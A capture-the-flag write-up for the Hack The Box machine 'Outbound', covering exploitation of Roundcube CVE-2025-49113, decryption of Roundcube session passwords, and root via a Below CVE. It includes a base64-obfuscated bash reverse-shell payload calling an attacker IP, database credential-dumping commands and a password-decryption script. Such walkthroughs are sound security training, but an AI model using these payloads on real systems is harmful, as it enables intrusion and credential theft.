---
title: Outbound
date: 2025-11-07
description: Easy Linux machine starting from assumed-breach credentials — exploiting Roundcube CVE-2025-49113 for authenticated RCE, decrypting session data from MySQL to recover a second user, and escalating via sudo abuse of a vulnerable Below installation.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

Assumed breach — starting credentials provided:

```text
tyler : LhKL1o9Nm3X2
```

```bash
nmap -p22,80 -A -oN scan_results.txt 10.10.11.77
```

```text
Nmap scan report for outbound.htb (10.10.11.77)
Host is up (0.60s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   617.99 ms 10.10.16.1
2   308.04 ms outbound.htb (10.10.11.77)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  4 14:18:26 2025 -- 1 IP address (1 host up) scanned in 42.87 seconds
```

The provided credentials didn't work for SSH but authenticated against **Roundcube** at `mail.outbound.htb`, running version **1.6.10**.

# User

## Roundcube RCE

Roundcube 1.6.10 is vulnerable to **CVE-2025-49113** — an authenticated PHP object deserialization leading to RCE through the `_from` parameter:

```bash
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzIvOTAwMSAwPiYxKSAm|base64 -d|bash'
```

Reverse shell captured. The process was running inside a container.

## MySQL Session Decryption

Switching to `tyler` with the provided credentials, the Roundcube config revealed database credentials and the 3DES key:

```text
roundcube : RCDBPass2025
des_key = rcmail-!24ByteDESkey*Str
```

User data and session blobs were dumped:

```bash
mysql -u roundcube -p RCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
```

```bash
mysql -u roundcube -p RCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
```

Base64-decoding a session blob exposed `jacob`'s username, encrypted password, and `auth_secret`. With the `des_key` in hand, TripleDES decryption recovered the plaintext:

```python
import base64
from Crypto.Cipher import DES3

key = b'rcmail-!24ByteDESkey*Str'
def rcube_decrypt(cipher_b64, key):
    cipher_raw = base64.b64decode(cipher_b64)
    iv = cipher_raw[:8]
    ciphertext = cipher_raw[8:]
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    pad_len = plaintext[-1]
    return plaintext[:-pad_len].decode(errors="ignore")

cipher_b64 = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
print(rcube_decrypt(cipher_b64, key))
```

## Container to Host

Container credentials for `jacob`:

```text
jacob : 595mO8DmwGeD
```

A mail in `jacob`'s directory revealed a newer system password following a password policy change:

```text
jacob : gY4Wr3a1evp4
```

SSH access obtained with the updated credentials.

# Root

`sudo -l` showed `jacob` could run **below** with elevated privileges:

```text
NOPASSWD: /usr/bin/below
```

Below 0.8.0 is vulnerable to **CVE-2025-27591** — an arbitrary file write through a log path symlink flaw. The exploit made `/etc/passwd` writable, granting full root access.

```bash
python3 cve-2025-27591.py
```

Gained `root`
